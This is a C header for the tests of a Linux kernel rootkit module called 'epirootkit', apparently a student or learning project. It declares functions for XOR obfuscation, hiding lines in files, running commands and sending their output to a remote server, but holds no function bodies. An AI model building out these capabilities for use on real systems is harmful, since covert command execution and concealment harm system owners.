#ifndef TEST_EPIROOTKIT_H
#define TEST_EPIROOTKIT_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>
#include "epirootkit.h"

// Shared variables
extern struct socket *g_connection_socket;

// External function declarations
void xor_cipher(char *data, int length);
void hide_line(const char *filename, unsigned long line);
void unhide_line(const char *filename, unsigned long line);
bool is_line_hidden(const char *filename, unsigned long line);

// Test function declarations - all marked as static
static int test_xor_cipher(void);
static int test_hide_line(void);
static int test_command_execution(void);
static int test_connection(void);

// Helper function declarations
static int exec_and_send_output(const char *command);
static int connect_to_server(void);

// Module init/exit - these must be non-static for module macros
int __init test_init(void);
void __exit test_exit(void);

#endif /* TEST_EPIROOTKIT_H */ 